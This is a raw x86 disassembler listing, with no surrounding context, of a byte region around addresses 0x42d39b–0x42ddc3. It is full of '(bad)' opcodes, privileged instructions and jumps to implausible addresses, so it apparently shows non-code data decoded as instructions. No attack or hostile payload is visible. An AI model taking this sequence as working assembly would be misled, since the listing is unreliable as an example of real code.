  42d39b:	sbb    DWORD PTR [ebx+0x56],ebx
  42d39e:	xor    DWORD PTR [eax+0x131aaa41],ebp
  42d3a4:	data16 fistp WORD PTR [esi]
  42d3a7:	sbb    bh,BYTE PTR [eax-0x54]
  42d3aa:	cmp    esi,DWORD PTR [ebp-0x48]
  42d3ad:	sbb    BYTE PTR ds:0x33d8b65a,bl
  42d3b3:	cmp    DWORD PTR [ecx+0x2135e293],esi
  42d3b9:	cmp    DWORD PTR ds:0x6f9af01,ecx
  42d3bf:	push   cs
  42d3c0:	mov    eax,ds:0xc222b3aa
  42d3c5:	popf   
  42d3c6:	cld    
  42d3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3c8:	mov    BYTE PTR [ebx],dl
  42d3ca:	sar    BYTE PTR [edi-0x69498ea4],0xb9
  42d3d1:	cmp    edx,edx
  42d3d3:	or     BYTE PTR [eax],ch
  42d3d5:	rcr    al,1
  42d3d7:	int    0x49
  42d3d9:	test   eax,0x9f29b3d2
  42d3de:	(bad)  
  42d3df:	mov    bh,0xf1
  42d3e1:	push   esp
  42d3e2:	sbb    esi,esi
  42d3e4:	and    ch,0x95
  42d3e7:	js     0x42d406
  42d3e9:	and    ebp,esi
  42d3eb:	(bad)  
  42d3ec:	pop    esi
	...
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	repz fs jmp 0x42d464
  42d466:	pop    ecx
  42d467:	in     al,0x1
  42d469:	add    bh,bh
  42d46b:	add    BYTE PTR [eax],al
  42d46d:	add    BYTE PTR [ebx],ah
  42d46f:	mov    bl,0x4f
  42d471:	sar    DWORD PTR [edx+0x37],cl
  42d474:	sbb    al,0x9b
  42d476:	(bad)  
  42d477:	sti    
  42d478:	mov    ch,0x98
  42d47a:	and    BYTE PTR [ecx-0xc6db7b9],cl
  42d480:	jns    0x42d4c3
  42d482:	mov    al,ds:0x755f63a9
  42d487:	rcl    BYTE PTR [eax-0x7bce98c6],0xba
  42d48e:	sti    
  42d48f:	pop    ss
  42d490:	add    edi,ebx
  42d492:	outs   dx,BYTE PTR ds:[esi]
  42d493:	pop    ebp
  42d494:	sbb    DWORD PTR [ebp-0x5c161d0b],ebx
  42d49a:	xor    eax,0x63661af0
  42d49f:	fild   QWORD PTR [ecx+0x23]
  42d4a2:	pop    edi
  42d4a3:	retf   0x4f3
  42d4a6:	sbb    ch,BYTE PTR [edi-0x75eac0ba]
  42d4ac:	mov    ebx,0x25e15399
  42d4b1:	aaa    
  42d4b2:	sahf   
  42d4b3:	add    DWORD PTR [ebp+ebx*2-0x19],edx
  42d4b7:	sbb    ebp,DWORD PTR [ecx*1+0x4d4ccad8]
  42d4be:	js     0x42d4c4
  42d4c0:	sar    BYTE PTR [edi+0x5e],cl
  42d4c3:	clc    
  42d4c4:	and    DWORD PTR [eax+0x275390ae],0xe38c6b68
  42d4ce:	cmp    ah,BYTE PTR [eax]
  42d4d0:	pop    ds
  42d4d1:	and    DWORD PTR [esi],esp
  42d4d3:	inc    edx
  42d4d4:	or     eax,0x763c28c6
  42d4d9:	pop    edx
  42d4da:	repnz dec edi
  42d4dc:	sub    al,0xa5
  42d4de:	(bad)  
  42d4df:	adc    BYTE PTR [ecx+ebx*1+0x8],dh
  42d4e3:	push   ss
  42d4e4:	inc    ebp
  42d4e5:	cld    
  42d4e6:	(bad)  
  42d4e7:	(bad)  
  42d4e8:	push   eax
  42d4e9:	sub    ebx,DWORD PTR [eax-0x5d]
  42d4ec:	add    al,0x7f
  42d4ee:	shl    BYTE PTR [edx+0x2a],0x95
  42d4f2:	leave  
  42d4f3:	cmp    al,0xb7
  42d4f5:	dec    eax
  42d4f6:	leave  
  42d4f7:	or     esi,ebx
  42d4f9:	xor    DWORD PTR [edi-0x5b],0x66
  42d4fd:	cmp    eax,0xe3c92016
  42d502:	inc    edx
  42d503:	fs jp  0x42d48c
  42d506:	dec    ecx
  42d507:	jo     0x42d4b9
  42d509:	jp     0x42d4bd
  42d50b:	out    0xda,al
  42d50d:	jl     0x42d4da
  42d50f:	mov    ch,0x54
  42d511:	popf   
  42d512:	pop    ds
  42d513:	mov    ah,0xaf
  42d515:	daa    
  42d516:	mov    bh,0xed
  42d518:	test   eax,0x3808c86d
  42d51d:	in     al,0xb3
  42d51f:	or     BYTE PTR [ebx-0xc564ec5],cl
  42d525:	xchg   ebp,eax
  42d526:	cdq    
  42d527:	pop    ecx
  42d528:	push   es
  42d529:	adc    eax,0x4b78a70d
  42d52e:	out    0x2,eax
  42d530:	push   0x69c9bea3
  42d535:	ss lock pop es
  42d538:	inc    eax
  42d539:	jnp    0x42d4f0
  42d53b:	scas   eax,DWORD PTR es:[edi]
  42d53c:	mov    ds:0x57c4caf4,al
  42d541:	mov    bh,0xcd
  42d543:	lds    eax,FWORD PTR [eax]
  42d545:	push   esi
  42d546:	jmp    0x560b2ac
  42d54b:	out    dx,eax
  42d54c:	mov    bl,0xb7
  42d54e:	mov    ecx,DWORD PTR [eax+edi*4]
  42d551:	sbb    bl,BYTE PTR [edi]
  42d553:	inc    esi
  42d554:	sbb    eax,0x86337df4
  42d559:	and    BYTE PTR [edx],ah
  42d55b:	inc    eax
  42d55c:	lea    eax,[edi]
  42d55e:	popa   
  42d55f:	mov    al,ds:0x38a8586b
  42d564:	or     bh,bl
  42d566:	popa   
  42d567:	sbb    DWORD PTR [edx+0x63],esp
  42d56a:	mov    ch,0xe
  42d56c:	out    dx,eax
	...
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x56e7d8d5,eax
  42d5e5:	cmp    ebx,DWORD PTR [eax-0x1b]
  42d5e8:	add    DWORD PTR [eax],eax
  42d5ea:	inc    DWORD PTR [eax]
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	stos   DWORD PTR es:[edi],eax
  42d5ef:	not    DWORD PTR [ebx]
  42d5f1:	mov    eax,ds:0x9061229f
  42d5f6:	xor    al,0xfb
  42d5f8:	scas   eax,DWORD PTR es:[edi]
  42d5f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5fa:	dec    ebx
  42d5fb:	pop    es
  42d5fc:	jae    0x42d658
  42d5fe:	push   es
  42d5ff:	lds    esp,FWORD PTR [esi-0x79e78588]
  42d605:	or     eax,0x63394929
  42d60a:	adc    al,0x36
  42d60c:	jecxz  0x42d68a
  42d60e:	jne    0x42d65e
  42d610:	stos   DWORD PTR es:[edi],eax
  42d611:	mov    esp,0xd43683a2
  42d616:	mov    ds:0xc320072a,eax
  42d61b:	test   eax,0xb4bf9ef6
  42d620:	rcr    DWORD PTR [ecx+0x38],0xaa
  42d624:	ja     0x42d5f0
  42d626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d627:	lahf   
  42d628:	mov    edx,0x1082fd49
  42d62d:	frstor [edx-0x10d74aec]
  42d633:	ret    0x3cbe
  42d636:	pop    eax
  42d637:	jo     0x42d610
  42d639:	adc    eax,0xdd10d9d3
  42d63e:	test   DWORD PTR [edx-0x42],eax
  42d641:	and    DWORD PTR [edi-0x4d45c9dc],edi
  42d647:	shl    BYTE PTR [edx+0x42],cl
  42d64a:	sub    eax,DWORD PTR [si-0x16da]
  42d64f:	pop    edi
  42d650:	scas   al,BYTE PTR es:[edi]
  42d651:	dec    ecx
  42d652:	adc    DWORD PTR [edi],esp
  42d654:	out    dx,eax
  42d655:	dec    ebx
  42d656:	jbe    0x42d664
  42d658:	repnz or eax,ebp
  42d65b:	(bad)  
  42d65c:	int3   
  42d65d:	inc    BYTE PTR [edx+edi*1]
  42d660:	mov    cl,0x31
  42d662:	xchg   al,cl
  42d664:	mov    ch,0x33
  42d666:	adc    ah,BYTE PTR [ecx-0x6e1e1c3]
  42d66c:	dec    edx
  42d66d:	xchg   ebx,eax
  42d66e:	cmovne edi,DWORD PTR [eax-0x34dc0bd7]
  42d675:	or     edx,DWORD PTR [edx+esi*1]
  42d678:	mov    ah,0xb6
  42d67a:	sbb    edi,ebx
  42d67c:	lea    ecx,[ebx+0x54]
  42d67f:	and    BYTE PTR [ebx-0x4d585fa9],dl
  42d685:	push   cs
  42d686:	lock jb 0x42d633
  42d689:	(bad)  
  42d68a:	jae    0x42d6a5
  42d68c:	adc    eax,0x7a140f4e
  42d691:	lahf   
  42d692:	xchg   esp,eax
  42d693:	ins    BYTE PTR es:[edi],dx
  42d694:	shl    DWORD PTR [ecx],1
  42d696:	jb     0x42d6d3
  42d698:	inc    ebp
  42d699:	sub    esp,DWORD PTR [ecx+0x514206d]
  42d69f:	xchg   DWORD PTR [edx+0x61],edx
  42d6a2:	and    BYTE PTR [esi-0x2a6d869e],ah
  42d6a8:	(bad)
  42d6ab:	inc    edx
  42d6ac:	push   0xffffffcb
  42d6ae:	or     bl,bh
  42d6b0:	xchg   esi,ecx
  42d6b2:	xor    al,0xde
  42d6b4:	fcmovnbe st,st(6)
  42d6b6:	addr16 sub al,ch
  42d6b9:	xchg   ecx,eax
  42d6ba:	xor    ecx,ebp
  42d6bc:	scas   al,BYTE PTR es:[edi]
  42d6bd:	stc    
  42d6be:	data16 jbe 0x42d706
  42d6c1:	les    esi,FWORD PTR gs:[edx+0xbe86233]
  42d6c8:	outs   dx,BYTE PTR ds:[esi]
  42d6c9:	retf   0x72c7
  42d6cc:	(bad)  
  42d6cd:	sysenter 
  42d6cf:	pop    edx
  42d6d0:	sub    ecx,DWORD PTR [ecx-0x56]
  42d6d3:	mov    al,ds:0x96957267
  42d6d8:	cli    
  42d6d9:	(bad)  
  42d6da:	rcl    DWORD PTR [eax],0x62
  42d6dd:	aas    
  42d6de:	sub    al,0x57
  42d6e0:	int    0xa5
  42d6e2:	dec    edx
  42d6e3:	mov    edx,0x695f3819
  42d6e8:	push   ds
  42d6e9:	cmp    al,0x22
  42d6eb:	leave  
  42d6ec:	sbb    al,0x0
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x2a
  42d763:	sub    eax,0xe657e7a0
  42d768:	add    DWORD PTR [eax],eax
  42d76a:	inc    DWORD PTR [eax]
  42d76c:	add    BYTE PTR [eax],al
  42d76e:	imul   edx,DWORD PTR [eax-0x4e],0xd527d800
  42d775:	pop    ecx
  42d776:	lds    ebp,FWORD PTR [edx-0x54]
  42d779:	sti    
  42d77a:	push   es
  42d77b:	jmp    0x9506796b
  42d780:	retf   
  42d781:	xchg   ebx,eax
  42d782:	mov    WORD PTR [ebx+esi*1+0x3643f300],cs
  42d789:	fs push 0xffffff9e
  42d78c:	and    bh,BYTE PTR [edi+0xb325e0c]
  42d792:	inc    ecx
  42d793:	push   es
  42d794:	xchg   edx,eax
  42d795:	popf   
  42d796:	push   esp
  42d797:	mov    DWORD PTR [ecx-0x2174f4d7],0x89e3fff1
  42d7a1:	mov    dh,ah
  42d7a3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42d7a5:	fcom   QWORD PTR [ecx+0x219c3a45]
  42d7ab:	jb     0x42d7ba
  42d7ad:	stc    
  42d7ae:	jbe    0x42d788
  42d7b0:	mov    edi,esi
  42d7b2:	jecxz  0x42d7b7
  42d7b4:	jg     0x42d75c
  42d7b6:	xchg   ebx,eax
  42d7b7:	xchg   edi,eax
  42d7b8:	repz lea esp,[edi]
  42d7bb:	fcomp  QWORD PTR [edi]
  42d7bd:	lea    ebp,[edi+0x37d53c4d]
  42d7c3:	push   edx
  42d7c4:	ret    0xcbc5
  42d7c7:	ret    
  42d7c8:	rcl    BYTE PTR [eax+0x5bb46136],1
  42d7ce:	retf   
  42d7cf:	mov    ebp,0xcc02de
  42d7d4:	xchg   esp,eax
  42d7d5:	(bad)  [ebx-0xa9682ed]
  42d7db:	pushf  
  42d7dc:	dec    ebp
  42d7dd:	xchg   ecx,esi
  42d7df:	clc    
  42d7e0:	push   es
  42d7e1:	inc    ecx
  42d7e2:	push   0xa6e3571c
  42d7e7:	xchg   esp,eax
  42d7e8:	ret    
  42d7e9:	sbb    edi,eax
  42d7eb:	mov    dl,al
  42d7ed:	inc    esp
  42d7ee:	sbb    esp,0x619c63a
  42d7f4:	inc    esp
  42d7f5:	jno    0x42d787
  42d7f7:	and    dl,BYTE PTR [ebx-0x4e]
  42d7fa:	lahf   
  42d7fb:	cdq    
  42d7fc:	mov    ds:0xfdfbe4b0,al
  42d801:	loop   0x42d82d
  42d803:	xchg   BYTE PTR [esi+0x5a],cl
  42d806:	lods   eax,DWORD PTR ds:[esi]
  42d807:	mov    bh,BYTE PTR [ecx]
  42d809:	cmp    ah,BYTE PTR [esi+edi*8+0x639c5572]
  42d810:	pop    esi
  42d811:	es mov ch,0x33
  42d814:	fistp  QWORD PTR [eax]
  42d816:	adc    BYTE PTR [eax-0x45],0x25
  42d81a:	jle    0x42d860
  42d81c:	jp     0x42d874
  42d81e:	jmp    0x8400ee44
  42d823:	or     eax,0x144e4aaa
  42d828:	adc    ah,al
  42d82a:	xor    BYTE PTR gs:[edx],dh
  42d82d:	xor    eax,0x5a7b4b57
  42d832:	ret    
  42d833:	push   edi
  42d834:	jo     0x42d80d
  42d836:	and    cl,ah
  42d838:	call   0x4cfc:0x185551a6
  42d83f:	sar    BYTE PTR [ebx+0x21],0xd8
  42d843:	push   ebp
  42d844:	mov    edx,0xa88e4798
  42d849:	test   DWORD PTR [esi+0x49],eax
  42d84c:	and    edi,edx
  42d84e:	retf   0xaec3
  42d851:	test   BYTE PTR [ecx+0x26001254],0x5f
  42d858:	shl    DWORD PTR [ebp-0x5e],0x7a
  42d85c:	mov    edx,0x62b26ae7
  42d861:	xor    ch,dh
  42d863:	ret    0x3a09
  42d866:	lock shl BYTE PTR [edx+edi*8+0x29],cl
  42d86b:	sti    
  42d86c:	arpl   WORD PTR [eax],ax
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xd0c6961a
  42d8e3:	pop    edx
  42d8e4:	jmp    0x22a2f6f
  42d8e9:	add    bh,bh
  42d8eb:	add    BYTE PTR [eax],al
  42d8ed:	add    BYTE PTR [ecx],al
  42d8ef:	inc    ebp
  42d8f0:	jg     0x42d8c6
  42d8f2:	inc    edx
  42d8f3:	loope  0x42d951
  42d8f5:	imul   edx,DWORD PTR [ebp+edi*2+0x50b5e1b5],0x5f
  42d8fd:	js     0x42d91f
  42d8ff:	scas   eax,DWORD PTR es:[edi]
  42d900:	in     eax,dx
  42d901:	sbb    DWORD PTR [ecx+0x3d5cc2f9],edx
  42d907:	shr    ch,cl
  42d909:	lods   al,BYTE PTR ds:[esi]
  42d90a:	test   BYTE PTR [edi-0x51a91b76],ch
  42d910:	pop    esi
  42d911:	sbb    bh,BYTE PTR [ecx+eax*2-0x51f7c462]
  42d918:	enter  0x6e8,0x1c
  42d91c:	add    ebp,DWORD PTR [ebp+0x6cae2586]
  42d922:	mov    WORD PTR [edx+eiz*4+0x7d142172],gs
  42d929:	push   esi
  42d92a:	rcl    DWORD PTR [esi-0x77],1
  42d92d:	cli    
  42d92e:	ror    dl,0xf7
  42d931:	in     al,dx
  42d932:	outs   dx,DWORD PTR ds:[esi]
  42d933:	(bad)  
  42d935:	xlat   BYTE PTR ds:[ebx]
  42d936:	sub    dl,bl
  42d938:	push   ss
  42d939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d93a:	mov    ?,WORD PTR [ecx-0x4cc0cc89]
  42d940:	leave  
  42d941:	push   0x6bbc75b3
  42d946:	pop    ecx
  42d947:	or     eax,0xb7e7a205
  42d94c:	int3   
  42d94d:	je     0x42d921
  42d94f:	nop
  42d950:	pop    ss
  42d951:	mov    edx,0x12f96782
  42d956:	push   eax
  42d957:	mov    esi,ss
  42d959:	push   es
  42d95a:	enter  0x2093,0x40
  42d95e:	sub    DWORD PTR fs:[eax+0x47],edi
  42d962:	inc    edx
  42d963:	or     eax,0xdd71dd1
  42d968:	mov    BYTE PTR [edi],ah
  42d96a:	pushf  
  42d96b:	and    al,0xbd
  42d96d:	rcr    DWORD PTR ds:0xac773060,1
  42d973:	xor    dh,bl
  42d975:	dec    ecx
  42d976:	(bad)  
  42d977:	dec    esp
  42d978:	mov    bl,0x72
  42d97a:	aas    
  42d97b:	or     al,0xf6
  42d97d:	sbb    BYTE PTR [edi+0x61d62012],ah
  42d983:	or     bl,BYTE PTR [ecx-0x6f0ab667]
  42d989:	mov    al,0xd4
  42d98b:	sahf   
  42d98c:	and    al,0x56
  42d98e:	pop    eax
  42d98f:	data16 cmc 
  42d991:	push   cs
  42d992:	xor    bh,al
  42d994:	fisubr DWORD PTR [ecx]
  42d996:	push   edx
  42d997:	cs in  eax,dx
  42d999:	loope  0x42d929
  42d99b:	xor    al,0x4e
  42d99d:	sar    DWORD PTR [eax+0x21a3f14e],1
  42d9a3:	dec    edi
  42d9a4:	ins    DWORD PTR es:[edi],dx
  42d9a5:	add    al,0xc3
  42d9a7:	mov    ?,edi
  42d9a9:	hlt    
  42d9aa:	cs in  eax,0x2f
  42d9ad:	subps  xmm3,XMMWORD PTR ds:0x1317b6c4
  42d9b4:	push   esi
  42d9b5:	mov    edx,0x412a5287
  42d9ba:	jp     0x42da04
  42d9bc:	push   esp
  42d9bd:	jge    0x42da10
  42d9bf:	lea    esi,[edi+ebp*2-0x4bd54ee]
  42d9c6:	jb     0x42d986
  42d9c8:	jbe    0x42d966
  42d9ca:	jmp    0x42d9b0
  42d9cc:	xchg   ebp,eax
  42d9cd:	sub    ah,ch
  42d9cf:	xchg   BYTE PTR [edx+ebx*2],bh
  42d9d2:	(bad)  
  42d9d3:	xchg   ebp,eax
  42d9d4:	xor    esi,DWORD PTR [ebx-0x6f9310c2]
  42d9da:	add    al,0xf6
  42d9dc:	adc    al,0x3c
  42d9de:	js     0x42d966
  42d9e0:	pop    ds
  42d9e1:	shl    BYTE PTR [esi+0x46e0b9cd],1
  42d9e7:	cmp    eax,0x905155e5
  42d9ec:	ins    DWORD PTR es:[edi],dx
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	pop    ds
  42da63:	jp     0x42dac8
  42da65:	fs push ebp
  42da67:	call   0x141da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	jnp    0x42d9f7
  42da70:	xor    bh,BYTE PTR [ecx-0x17]
  42da73:	sbb    dh,BYTE PTR [eax]
  42da75:	sbb    ebx,DWORD PTR [edx-0x698a5771]
  42da7b:	or     DWORD PTR [edi+0x31b7358],ebp
  42da81:	gs dec ecx
  42da83:	sub    al,BYTE PTR [ebp+0x16]
  42da86:	pop    edx
  42da87:	outs   dx,BYTE PTR ds:[esi]
  42da88:	sbb    eax,0x8f3f2506
  42da8d:	add    al,0x6d
  42da8f:	mov    bl,0xe3
  42da91:	lahf   
  42da92:	sti    
  42da93:	jmp    0x42dac0
  42da95:	adc    dh,cl
  42da97:	jle    0x42da62
  42da99:	jo     0x42da45
  42da9b:	shl    BYTE PTR [ebp-0xc20dc8a],0x90
  42daa2:	jno    0x42da50
  42daa4:	pop    eax
  42daa5:	mov    edx,0xe810b63b
  42daaa:	sub    ah,BYTE PTR [edx]
  42daac:	mov    edi,0x9f68b771
  42dab1:	mov    ebp,0x1547a746
  42dab6:	and    esi,ebx
  42dab8:	in     al,dx
  42dab9:	dec    eax
  42daba:	cdq    
  42dabb:	mov    ah,0x9a
  42dabd:	mov    dl,BYTE PTR [ebx-0x28]
  42dac0:	aad    0x32
  42dac2:	ret    0x4a92
  42dac5:	int    0xca
  42dac7:	xchg   ebp,eax
  42dac8:	xchg   BYTE PTR [ebx],dl
  42daca:	(bad)  
  42dacb:	out    dx,eax
  42dacc:	add    BYTE PTR [edi+0x396c7e74],0x2d
  42dad3:	in     eax,0x9c
  42dad5:	jo     0x42da7a
  42dad7:	leave  
  42dad8:	loop   0x42dac4
  42dada:	mov    ch,0xa0
  42dadc:	jb     0x42dab3
  42dade:	mov    ebp,DWORD PTR [ebx-0x7e]
  42dae1:	xor    ecx,DWORD PTR [ebp+0x3e9af4a0]
  42dae7:	jge    0x42dabe
  42dae9:	lods   al,BYTE PTR ds:[esi]
  42daea:	(bad)  
  42daec:	test   al,0x29
  42daee:	stos   BYTE PTR es:[edi],al
  42daef:	dec    edx
  42daf0:	mov    ecx,0x315979f2
  42daf5:	cld    
  42daf6:	test   al,0x12
  42daf8:	jp     0x42dacf
  42dafa:	in     al,0x8d
  42dafc:	retf   
  42dafd:	adc    ecx,DWORD PTR [eax]
  42daff:	add    BYTE PTR [esi-0x48],ch
  42db02:	cwde   
  42db03:	xchg   ecx,eax
  42db04:	leave  
  42db05:	push   esp
  42db06:	out    dx,al
  42db07:	add    edi,DWORD PTR [ebx+0x6e0b9bc7]
  42db0d:	pusha  
  42db0e:	ja     0x42db4e
  42db10:	push   eax
  42db11:	adc    eax,0xfddaf920
  42db16:	in     al,dx
  42db17:	scas   al,BYTE PTR es:[edi]
  42db18:	or     bl,BYTE PTR [esp+ebp*8-0x4e41ed16]
  42db1f:	xor    al,0xa1
  42db21:	imul   edx,DWORD PTR [ecx],0x1c
  42db24:	pop    ebx
  42db25:	xor    DWORD PTR [edi+edx*4-0x7a0439f7],edx
  42db2c:	pop    ebx
  42db2d:	sahf   
  42db2e:	add    DWORD PTR ds:0xae9f149f,ebx
  42db34:	stos   BYTE PTR es:[edi],al
  42db35:	mov    eax,ds:0x3417ac7c
  42db3a:	inc    edx
  42db3b:	sbb    dl,al
  42db3d:	xor    BYTE PTR [edi-0x3414b8ac],dl
  42db43:	jl     0x42db02
  42db45:	push   eax
  42db46:	xor    eax,0xbd29b860
  42db4b:	dec    edx
  42db4c:	jne    0x42db5d
  42db4e:	fcmovnu st,st(3)
  42db50:	shr    BYTE PTR [esi],1
  42db52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db53:	mov    ecx,0xdda3c800
  42db58:	pop    eax
  42db59:	push   ecx
  42db5a:	lock stos BYTE PTR es:[edi],al
  42db5c:	neg    ch
  42db5e:	xor    BYTE PTR [eax-0x2a301415],0x6e
  42db65:	jnp    0x42db1c
  42db67:	mov    dl,0x93
  42db69:	mov    ds:0xe49af2,eax
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbc0
  42dbe3:	mov    edi,0xe954e20c
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	inc    DWORD PTR [eax]
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	push   esp
  42dbef:	lahf   
  42dbf0:	addr16 clc 
  42dbf2:	fild   DWORD PTR [eax+0x592a829f]
  42dbf8:	cs nop edi
  42dbfc:	inc    esi
  42dbfd:	aas    
  42dbfe:	xor    ecx,ebx
  42dc00:	test   eax,0x76797880
  42dc05:	jns    0x42dc20
  42dc07:	xchg   edx,eax
  42dc08:	sub    DWORD PTR [ebx],ebp
  42dc0a:	or     al,0xa
  42dc0c:	xchg   BYTE PTR ds:0x438b05e5,bl
  42dc12:	(bad)  
  42dc13:	push   ecx
  42dc14:	jne    0x42dbc5
  42dc16:	shr    ebx,0x32
  42dc19:	les    edx,FWORD PTR [edi-0x6aa68734]
  42dc1f:	mov    ecx,0x1635ab93
  42dc24:	mov    WORD PTR [esi+0x5e],ds
  42dc27:	pop    ss
  42dc28:	into   
  42dc29:	dec    ecx
  42dc2a:	dec    esi
  42dc2b:	cmp    eax,0xbeed1c7d
  42dc30:	or     eax,DWORD PTR [edx-0x31]
  42dc33:	xor    esi,DWORD PTR [edi+edi*1-0x4524e226]
  42dc3a:	push   eax
  42dc3b:	jmp    0x975c7dc1
  42dc40:	push   esp
  42dc41:	xchg   edx,eax
  42dc42:	loop   0x42dc16
  42dc44:	shr    DWORD PTR [esi],1
  42dc46:	stos   DWORD PTR es:[edi],eax
  42dc47:	neg    DWORD PTR [ecx]
  42dc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc4a:	(bad)  
  42dc4c:	push   eax
  42dc4d:	fwait
  42dc4e:	dec    ebp
  42dc4f:	outs   dx,DWORD PTR ds:[esi]
  42dc50:	fwait
  42dc51:	push   ebx
  42dc52:	(bad)  
  42dc53:	aam    0x1d
  42dc55:	inc    ebx
  42dc56:	out    dx,al
  42dc57:	cmc    
  42dc58:	dec    ebp
  42dc59:	into   
  42dc5a:	jnp    0x42dc0d
  42dc5c:	call   0x2bc27455
  42dc61:	jnp    0x42dc70
  42dc63:	fs repnz push esi
  42dc66:	jecxz  0x42dc6e
  42dc68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc69:	jecxz  0x42dcaa
  42dc6b:	ss mov eax,0x275ab36a
  42dc71:	into   
  42dc72:	(bad)  
  42dc73:	jns    0x42dbf6
  42dc75:	mov    esi,DWORD PTR [edx-0x60]
  42dc78:	fstp   QWORD PTR [ebx-0x60]
  42dc7b:	neg    DWORD PTR [edx]
  42dc7d:	in     eax,dx
  42dc7e:	std    
  42dc7f:	mov    ecx,DWORD PTR [edx+0x67]
  42dc82:	arpl   WORD PTR [ecx],bx
  42dc84:	sbb    ch,BYTE PTR [ecx]
  42dc86:	ins    DWORD PTR es:[edi],dx
  42dc87:	out    0xa9,eax
  42dc89:	in     al,dx
  42dc8a:	cli    
  42dc8b:	dec    edi
  42dc8c:	je     0x42dc7c
  42dc8e:	loope  0x42dcaf
  42dc90:	test   al,0x25
  42dc92:	call   0xa274ca00
  42dc97:	xchg   ebp,eax
  42dc98:	jb     0x42dca2
  42dc9a:	jmp    0x42dce9
  42dc9c:	enter  0xdc77,0x6b
  42dca0:	dec    edx
  42dca1:	cmp    BYTE PTR ds:0x15457923,dh
  42dca7:	xchg   esi,eax
  42dca8:	cs push ss
  42dcaa:	adc    ebx,edx
  42dcac:	(bad)  
  42dcad:	ja     0x42dc53
  42dcaf:	cmp    DWORD PTR [esi-0x3d],ebp
  42dcb2:	sahf   
  42dcb3:	jne    0x42dc51
  42dcb5:	sar    DWORD PTR [ecx+0x3a],0xb5
  42dcb9:	mov    esi,0x222aaa1c
  42dcbe:	push   ds
  42dcbf:	shl    BYTE PTR [ebx],0xdd
  42dcc2:	and    cl,BYTE PTR [eax]
  42dcc4:	lods   al,BYTE PTR ds:[esi]
  42dcc5:	or     BYTE PTR [ecx],bh
  42dcc7:	inc    esp
  42dcc8:	rcl    bh,0x3d
  42dccb:	in     al,0xe8
  42dccd:	clc    
  42dcce:	rcl    esi,cl
  42dcd0:	mov    esp,0x9e964619
  42dcd5:	xor    al,0x5f
  42dcd7:	clc    
  42dcd8:	cmp    BYTE PTR [edi-0x1b7e4f8e],bh
  42dcde:	push   es
  42dcdf:	xchg   BYTE PTR [edx+0x53d1f9f4],ch
  42dce5:	xor    al,bh
  42dce7:	xor    eax,0x3eadf41d
  42dcec:	push   cs
	...
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	pop    es
  42dd63:	mov    eax,ds:0xea53835f
  42dd68:	add    DWORD PTR [eax],eax
  42dd6a:	inc    DWORD PTR [eax]
  42dd6c:	add    BYTE PTR [eax],al
  42dd6e:	pop    esi
  42dd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd70:	sub    edx,DWORD PTR [edx]
  42dd72:	ins    DWORD PTR es:[edi],dx
  42dd73:	or     BYTE PTR [edi+eax*1+0xc],ah
  42dd77:	inc    eax
  42dd78:	mov    al,BYTE PTR [eax+0x3f]
  42dd7b:	dec    edi
  42dd7c:	aam    0xf7
  42dd7e:	clc    
  42dd7f:	cld    
  42dd80:	jecxz  0x42dd36
  42dd82:	pop    edi
  42dd83:	inc    ebx
  42dd84:	out    0x47,al
  42dd86:	pop    edx
  42dd87:	push   0xffffffac
  42dd89:	es scas eax,DWORD PTR es:[edi]
  42dd8b:	add    bh,ch
  42dd8d:	bound  esi,QWORD PTR [esi+0x2f92d967]
  42dd93:	clc    
  42dd94:	cmp    BYTE PTR ds:0x682ad479,dl
  42dd9a:	mov    ds:0xd7e3b27d,eax
  42dd9f:	push   ecx
  42dda0:	sub    esp,0x6837f5de
  42dda6:	adc    ah,BYTE PTR [esi+0x6cd71c0d]
  42ddac:	dec    ebx
  42ddad:	inc    esp
  42ddae:	or     ebp,esi
  42ddb0:	jae    0x42dd4c
  42ddb2:	pop    es
  42ddb3:	dec    edx
  42ddb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddb5:	les    edi,FWORD PTR ds:[ebx+0x15]
  42ddb9:	mov    dl,0x2
  42ddbb:	rol    DWORD PTR [ecx-0x5cba2025],1
  42ddc1:	inc    eax
  42ddc2:	lahf   
  42ddc3:	add    al,0xf1
